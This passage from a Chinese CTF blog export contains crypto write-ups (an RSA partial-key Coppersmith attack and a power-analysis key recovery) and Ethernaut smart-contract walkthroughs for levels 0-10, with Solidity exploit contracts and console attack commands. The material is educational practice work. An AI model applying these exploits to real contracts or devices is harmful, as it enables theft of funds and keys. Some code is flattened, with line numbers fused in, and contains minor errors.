print "====" y=int(raw_input("y: "),16) if (pow(x,e,n)==y and pow(y,d,n)==t): print "s:",hex(int(bin(p)[2:][0:568],2))run() 我们可以输入X为空字符，Y为u，就可以得到s(官方WP说这也是他们出题失误导致可以这么做hhhh)12345678910111213141516171819202122232425262728293031323334353637#coding=utf-8from pwn import *from itertools import countfrom hashlib import md5import base64 p=remote('118.31.18.75',20013) salt=p.recvline()msg = base64.b64decode(salt)work=""for i in count(): hashid = md5(msg+str(i)).hexdigest() if hashid.startswith('0000'): #print i,hashid work=base64.b64encode(str(i)) break#print workt=1718378855p.recvuntil('work: ')p.sendline(work)print p.recvline()print p.recvline()print p.recvline()print p.recvline()u = int(p.recvline()[5:-2],16) #uprint "u:",hex(u)print p.recvline()p.recvuntil('x: ')#print str(hex(t))p.sendline("") #xprint p.recvline()p.recvuntil('y: ') #yp.sendline(str(hex(u))[2:])# p_568=int(p.recvline()[5:-2],16)# print "p_568:",hex(p_568)print p.recvline() 之后我们得到s，是p的前568位二进制数组成的数，这里有个小坑，直接拿去高位攻击是不行的，因为必须要已知576位才能高位攻击，所以我们要爆破568到576中的八位二进制数即两位十六进制然后再进行已知高位攻击，直接放sage代码123456789101112131415161718192021222324252627282930313233from sage.all import *import binasciin = 0x9d3a1a28ecb1bd245dd86b18dc4c5b729f23778710005118836129f08e31d6516de8ab47db1b3b7f660f50d283b1e9f2c06e7836136e4c0159f5d2b05771861d3ce6aa8715932eadc1cc0f380909a1961018340f7393142f9c177b1187151f97ac8cdc4ad17fa59a0f39d192af555f27de9cc800846eb2ca6ce78f87c0c0fbf47828328392b81771af624389fd779d130d80739bb7a608961125ba3f1800c766440fa70bfd3f834294d47d7ed9cfffd6d14ae18310f6c1d6d8f88b6c5d72a0b45608b4e21bbb8e314220ed7a2d6a8c95454e571c71b50f1d6a823778ca47131f5b889a1ed1957248bee8c4ac66872a5fd58a121560a27bad4958f1c763f2ffddL cipher = 0x1f2deea59244b14e53c72465febc2064172a35245842fa83ebff313344bed35ee8af8c3f8f61e6f498fa1fd35e63998a573d7717905f72ec01de0b0529eaab10eb0b0c2ca06e9d6e4245e748fd74f4f756a86e379559793389a3ae6c421d51bb78331a487fc3c3e68971e3e26991ab34ce2a2c07ffd5a5a1e215e766b51fb2d6aab63c2dafa3c87d0a5eb79b634740e1fca7a727de997958839bda684e19acad93cae4abfd1c8cc3684419f83696fe4840f3253e7c038adb13a1382667cf7e17ef55c1e950ea474594102e660e36a23bfd3fd830d1c18a434d0b34bed98308399a894dcab909d68bcab7c7ac990974a4f6ed7d612abb7044f6734eaaebcdc0b5L e2 = 0x10001pbits = 1024for i in range(0,127): p4=0xda5df16f286dbc825cd0c8ee48aa26ac27338a75172c5b92351f14d083216f7e91b9355e27cf930646fbbda6058dec3c4ddf751f36df5556359fbe671f9b947b4c79cadfdbb27b00 p4=p4+int(hex(i),16) print hex(p4) kbits = pbits - p4.nbits() #未知需要爆破的比特位数 print p4.nbits() p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.4) # find root &lt; 2^kbits with factor &gt;= n^0.4 #rint roots if roots: #爆破成功，求根 p = p4+int(roots[0]) print "p: ", hex(int(p)) assert n % p == 0 q = n/int(p) print "q: ", hex(int(q)) print gcd(p,q) phin = (p-1)*(q-1) print gcd(e2,phin) d = inverse_mod(e2,phin) flag = pow(cipher,d,n) flag = hex(int(flag))[2:-1] print binascii.unhexlify(flag) 侧信道攻击参考资料 能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．与其 他攻击方法不同：这种攻击利用的是密码设备的能量消耗特征，而非密码算法的数学特性．能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。 能量分析攻击是安全领域内非常重要的一个部分，我们只在这里简单讨论下。 能量分析攻击分为： - 简单能量分析攻击（SPA），即对能量迹进行直观分析，肉眼看即可。 - 差分能量分析攻击（DPA），基于能量迹之间的相关系数进行分析。 攻击条件攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等 例题:HITB-2017 Hack in the card I题目给出了公钥文件 publickey.pem，密文，测量智能卡功率的电路图，和解密过程中智能卡消耗的功率变化（通过在线网站给出 trace）。 密文为1014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 由于网站只给出了一条能量迹，所以可以断定这是 Simple channel analysis（SPA）攻击。那么我们可以直接通过观察能量迹的高低电平来获得 RSA 解密过程的密钥 d。 RSA 可被 SPA 攻击的理论基础来自于 RSA 中包含的快速幂取余算法。 快速幂算法如下1.b为偶数时:$$ a^b mod(c) = (a^{2^{b/2}} )mod(c) $$ 2.b为奇数时：$$ a^b mod(c) = (a^{2^{b/2}} \times a) mod(c) $$ 相应的C代码实现为:123456789101112int PowerMod(int a, int b, int c)&#123; int ans = 1; a = a % c; while(b&gt;0) &#123; if(b % 2 == 1) // 当b为奇数时会多执行下面的指令 ans = (ans * a) % c; b = b/2; a = (a * a) % c; &#125; return ans;&#125; 由于快速幂的计算过程中会逐位判断指数的取值，并会采取不同的操作，所以可从能量迹中还原出 d 的取值（从上面可知，直接得到的值是 d 的二进制取值的逆序） 注意： 有时候模乘也可能会从高位向低位进行模乘。这里是从低位向高位模乘。 那么根据上面的说法，我们可以看出来能量迹高位的时候的长度不同，长的对应1，短的对应2，也就是如下图所示： 我们可以通过这个信息还原d。 在给的能量迹的html中我们可以找到data数组，对应着能量迹的每一个点。其中前面的能量迹的点有波动可以不管，我们从稳定的位置开始分析即可，也就是data[200]之后 我们可以统计每一个高电平的点的数量.经过统计我们可以得到：100个点对应1，50个点对应0，则解题脚本如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import gmpy2f = open('./data.txt')data = f.read().split(",")#print('point number:', len(data))start_point = 205lflag = 0rflag = 0flag = 0res = ''for point_index in range(start_point, len(data)): if float(data[point_index]) &gt; 225 and flag == 0: lflag = point_index flag = 1 continue if float(data[point_index]) &lt; 225 and flag == 1: rflag = point_index flag = 0 r = rflag - lflag if r &gt; 75: res += '1' else: res += '0' continueout = ''for i in range(len(res)): data = res[len(res)-i-1] out += data#print(out)d = int(out,2)print(d)n = 0x17AE4F9BD4FF06B94C46DCBB7070070C7C23C4E8728BE3173CA815FCA5471C0BB35B19ED8838530ABB27D69B1C9D87229D0658D807D8EF74D732576DF4FBA9CD611FC768BE6047C52E8168A1C77E0E54D4877DC20A73FC3A2DB35DDE8700E79BAF61676BF6B6B27032E6B9F3A02F3FAAAFF36251BF2935D9CB45EFAC13D0974484C3D53C2A66A3D279D2B1B594F3797C0B8D33409161F7293EECB5287F45DA104020F0215BCC824338AD4A316E25E4A167A6E4928AF122FA0A55C4E55DEE01A4E0EED89F4B290BF79B5CAFE797AE4FA4B369E043AA0DFE91487E9054FF843EA249ED7945C8A911796F81A0F82EB5694A2FE2EBFF13A9E6DF3334FCAA1C63CBAC3'''e = '01:58:3f:58:ca:92:30:c4:f8:84:4c:7f:33:d6:19:83:c2:7b:f6:11:94:7a:1d:ce:39:00:73:03:88:05:17:5b:18:f2:45:54:3b:61:c6:ea:ab:46:a5:72:d0:34:26:47:6e:9a:ec:c3:47:16:cd:ac:9e:33:f0:31:f5:38:1d:18:cf:21:2a:81:91:f8:26:dd:10:e0:4f:db:50:6b:a9:fd:91:e4:83:1d:8a:dc:4c:75:aa:2a:a6:13:2e:7e:48:ea:c6:6d:7e:cf:24:42:82:95:eb:1b:7c:64:48:0c:f1:70:be:83:bc:d8:53:f9:77:9e:6d:f5:99:9c:2b:ee:f8:38:d2:f0:c4:d8:fc:4d:9c:8e:4c:6c:37:25:94:46:68:9e:c3:06:34:bc:d6:8f:29:3c:58:cd:44:03:9b:e6:29:9f:92:64:96:20:d6:e6:01:7d:fd:60:07:d1:bd:01:2d:f7:ca:be:c4:59:e0:e9:83:f1:7b:50:51:af:4a:4f:ca:5c:c7:1c:dd:72:a6:f4:80:8e:73:f8:33:91:7c:2f:54:80:1b:d9:a0:6e:35:99:ed:b9:a6:29:36:76:4c:e0:84:db:f5:55:c1:6f:9e:47:81:ea:d6:fd:39:79:24:76:c6:df:c0:dd:05:ad:a2:81:f7:51:11:ef:d7:52:80:65:d9:e3:5b'e = e.split(':')eout = ''for i in e: eout +=iprint(eout)'''e = 0x01583f58ca9230c4f8844c7f33d61983c27bf611947a1dce390073038805175b18f245543b61c6eaab46a572d03426476e9aecc34716cdac9e33f031f5381d18cf212a8191f826dd10e04fdb506ba9fd91e4831d8adc4c75aa2aa6132e7e48eac66d7ecf24428295eb1b7c64480cf170be83bcd853f9779e6df5999c2beef838d2f0c4d8fc4d9c8e4c6c37259446689ec30634bcd68f293c58cd44039be6299f92649620d6e6017dfd6007d1bd012df7cabec459e0e983f17b5051af4a4fca5cc71cdd72a6f4808e73f833917c2f54801bd9a06e3599edb9a62936764ce084dbf555c16f9e4781ead6fd39792476c6dfc0dd05ada281f75111efd7528065d9e35bm = 0X014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 t = pow(m,d,n)#t = '484954427b4d79206e616d6520697320416c6963652c20616e642074686973206973206d792073746f72792c2074686520656e64206f66206d792073746f72797d'print hex(t)[2:-1].decode('hex')]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut训练]]></title>
    <url>%2F2019%2F01%2F08%2Fethernautd%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接 level 0 - Hello Ethernaut题目链接 第一步首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络 第二步打开控制台，然后会发现给了合约地址和help 其中level地址为 0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c在Ropsten测试网络下还会有你的player地址和Ethernaut地址使用player指令可以直接获得player地址 第三步之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7 第四步使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的公共方法列表，当然在下面可以看见例如owner: f()之类的东西就是方法的具体信息 第五步与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用ethernaut.owner()，返回的是智能合约的拥有者 第六步这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至中文，然后点击存入-测试水管，之后点击request 1 ether from faucet就行 第七步生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间 成功之后会显示下图 第八步题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用contract.方法就行 第九步从contract.info()入手跟着走下去就行 之后点击submit instance即可过关。 通关后的彩蛋 Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.You are now ready to complete all the levels of the game, and as of now, you’re on your own.Godspeed!! level 1 - Fallback题目链接 胜利条件1.获得合约的所有权2.收回合约的所有余额 tips1.如何用ABI发送ether2.如何用ABI以外的方法发送ether3.查看help()会有帮助4.Fallback方法 源码123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; //构造函数，初始化owner的contributions为1000 contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; //将合约拥有权交给贡献1000ETH以上的人 require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; //查询contribution return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用 owner.transfer(this.balance); &#125; function() payable public &#123; //fallback函数，当满足发送的value大于1并且发送者的contributions的值大于1时将owner变为消息发送者 require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 预备知识回退函数(fallback function)1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。 2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。 我们在这里要用到的就是第二点 解题思路最终目的是调用withdraw()方法将余额清零，也就是我们要成为ownercontribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）在fallback中只要满足msg.value&gt;0且contributions[msg.sender]&gt;0即可成为owner其中msg.value我们可以直接发送过去，而contributions[msg.sender]我们需要调用contribute()这个函数，也就是参数满足value&lt;0.001的条件就行 具体步骤1.调用contribute函数，传入参数value=1其中value的单位是wei 11 eth = 1e9 Gwei = 1e18 wei 2.调用send函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用contract.sendTransaction({value: 100}))， 由于send函数会调用fallback函数，我们便成为了owner 3.调用withdraw函数，将钱卷走 4.点击submit instance即可过关。 注意事项绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号(:зゝ∠) 通关后的彩蛋 You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.Move on to the next level when you’re ready! level 2 - Fallout题目链接 胜利条件1.获得合约的所有权 tips1.Solidity Remix IDE 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 解题思路可以看出函数的构造函数写错了，Fallout写成了Fal1out，变为了谁都可以调用的函数(我们无法调用构造函数)。所以我们可以调用构造函数成为owner，然后再调用collectAllocations取钱 具体步骤1.调用Fal1out函数，成为owner 2.调用collectAllocations函数，将钱卷走 3.点击submit instance即可过关。 通关后的彩蛋 That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?Well… Not quite.The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:12345&gt; contract Rubixi &#123;&gt; address private owner;&gt; function DynamicPyramid() &#123; owner = msg.sender; &#125;&gt; function collectAllFees() &#123; owner.transfer(this.balance) &#125;&gt; ... This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland. level 3 - Coin Flip题目链接 胜利条件1.猜抛硬币的结果，连续猜对十次即可获胜 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; 预备知识1.revert()这行代码：if(msg.sender != owner) { throw; }完全等价于如下三种形式：if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner); 解题思路1.从随机数逻辑生成来看，主要有三个步骤&nbsp;&nbsp;&nbsp;&nbsp;a.获取上一个块的hash&nbsp;&nbsp;&nbsp;&nbsp;b.判断hash是否和上一次的hash相同，相同则回退&nbsp;&nbsp;&nbsp;&nbsp;c.根据blockValue/FACTOR的结果判断硬币正负 2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可 具体步骤1.编写exp合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract exp&#123; CoinFlip C; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 function setCoinflip(address _addr) public &#123; C = CoinFlip(_addr); &#125; function hack() public OwnerOnly &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; C.flip(side); &#125;&#125; 2.部署在remix上并运行hack方法十次 3.通过命令contract.consecutiveWins()可查询猜对的次数 4.当猜对的次数为10次以上之后，点击submit instance即可过关。 通关后的彩蛋 Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor. Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize). level 4- Telephone题目链接 胜利条件1.获得合约的所有权 tips1.See the Help page above, section &quot;Beyond the console&quot;,这一节主要就是教你可以使用Remix和Truffle进行合约编写和attack，也就是我们所说的写exp并运行。 源码12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 预备知识1.tx.origin 全局变量，也就是合约的owner 解题思路1.我们可以编写代码调用changeOwner，传入我们的地址，就可以变成合约owner了 具体步骤1.编写exp合约123456789101112131415161718192021222324252627pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract exp&#123; Telephone tel; function setAttackAddr(address _addr)&#123; tel = Telephone(_addr); &#125; function attack(address _addr)&#123; tel.changeOwner(_addr); &#125;&#125; 2.获取合约地址和我们自己的用户地址，并查询合约拥有者 3.进行攻击 4.再次查询合约拥有者，发现变成了我们，攻击完毕 5.点击submit instance即可过关。 通关后的彩蛋 While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.An example of a possible attack is outlined below.1.Use tx.origin to determine whose tokens to transfer, e.g.1234&gt; function transfer(address _to, uint _value) &#123;&gt; tokens[tx.origin] -= _value;&gt; tokens[_to] += _value;&gt; &#125; 2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.123&gt; function () payable &#123;&gt; token.transfer(attackerAddress, 10000);&gt; &#125; In this scenario, tx.origin will be the victim’s address (while msg.sender will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker. level 5- Token题目链接 胜利条件1.攻击Token代币合约2.开始时会获取20个代币，我们需要获得额外的、大量的代币 tips1.odometer 源码12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; //初始化代币给owner balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于0 require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量 return balances[_owner]; &#125;&#125; 解题思路1.从transfer函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可 具体步骤1.初始化信息 2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出 3.点击submit instance即可过关。 通关后的彩蛋 Overflows are very common in solidity and must be checked for with control statements such as:123&gt; if(a + c &gt; a) &#123;&gt; a = a + c;&gt; &#125; An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:1&gt; a = a.add(c); If there is an overflow, the code will revert. level 6- Delegation题目链接 胜利条件1.获得合约的所有权 tips1.查看Solidity文档中关于delegatecall low level function的内容2.Fallback方法3.Method ids 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; //初始化 delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; //FallBack函数 if(delegate.delegatecall(msg.data)) &#123; //执行参数为data的delegatecall this; &#125; &#125;&#125; 预备知识1.delegatecall简单来说就是delegatecall执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过delegatecall调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)具体内容可以参考这篇文章，写的挺详细的链接 解题思路1.首先我们的目的是通过delegatecall来执行Delegate合约中的pwn方法，进而通过delegatecall的漏洞来改变Delegation合约的owner，也就是改成我们。2.为了执行delegatecall，我们需要执行fallback函数，传入的data参数应该为pwn()的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位) 具体步骤1.初始化实例并查看合约的owner 2.构造exp并执行contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)}).完毕之后查看owner，发现已经变成我们 3.点击submit instance即可过关。 通关后的彩蛋 Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care. Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD. level 7- Force题目链接 胜利条件1.让合约的balance&gt;0 tips1.Fallback方法2.用其他合约去攻击这个合约3.用Remix或Truffle 源码1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)*/&#125; 预备知识1.selfdestruct函数(析构函数)selfdestruct(address)会将当前合约的余额发送至address。 2.没有fallback函数如何往合约里打钱？当合约没有实现payable fallback函数的时候，依然有两种方法给合约里打钱&nbsp;&nbsp;&nbsp;&nbsp;a.将合约作为挖矿地址挖矿&nbsp;&nbsp;&nbsp;&nbsp;b.调用其他合约的析构函数selfdestruct并将此合约的地址作为参数 解题思路1.我们自己编写一个合约并约束一个方法为payable，并通过该方法向此合约中打钱。2.调用此合约的selfdestruct函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。 具体步骤1.编写exp合约12345678910contract exp&#123; address attackAddr; function init(address _addr) public payable&#123; attackAddr=_addr; &#125; function attack()&#123; selfdestruct(attackAddr); &#125;&#125; 2.先调用init函数设置攻击合约的地址，并附加上一定数额的ETH 3.再调用attack函数进行转钱 3.点击submit instance即可过关。 通关后的彩蛋 In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant this.balance == 0 for any contract logic. level 8- Vault题目链接 胜利条件1.获得password并调用unlock函数使得locked参数变为false 源码1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 预备知识1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了private，该信息依然是公开的，可以随时被别人查看。 解题思路1.通过读取区块链上的块中的信息获取password2.用该password作为参数调用unlock函数进行解锁 具体步骤1.通过web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))指令查看password 2.将password传入unlock函数 3.点击submit instance即可过关。 通关后的彩蛋 It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. level 9- King题目链接 胜利条件1.你可以通过打钱成为新的King，当然前提是你的前比上一个King的钱多2.当你点击Submit的时候合约会重新变为King，你要想办法去保持King位 源码123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; //打更多的钱或者合约owner都可以调用此方法变为king require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; 预备知识1.Solidity 中几种转币方式。 &lt;address&gt;.transfer()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会 throw; 回滚状态&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.send()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.call.value()()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;传递所有可用 Gas 供调用，不能有效防止重入（reentrancy） 解题思路1.由于最后合约owner会调用fallback函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止transfer2.我们可以自己写个合约并将fallback函数设为revert()，这样就没有人可以通过transfer()打钱给我们。当然我们甚至可以不写fallback函数也可以实现这个效果 具体步骤1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了)12345678pragma solidity ^0.4.18;contract exp &#123; function exp() public payable &#123; address attackAddr = 0x529c6e4d28d24af49eada89a2f7effa44c8f58c3; attackAddr.call.gas(1000000).value(msg.value)(); &#125;&#125; 2.部署合约，注意要传入比原先的1ETH多 3.查看king可以发现king已经变成了我们部署的合约的地址 4.点击submit instance即可过关。 通关后的彩蛋 Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.In this case, see: King of the Ether and King of the Ether Postmortem level 10- Re-entrancy题目链接 胜利条件1.将合约中的所有钱卷走 tips1.不可信的合约可以执行人们不希望出现的代码2.Fallback方法3.Throw/revert bubbling4.用其他合约去攻击这个合约5.用Remix或Truffle 源码12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; 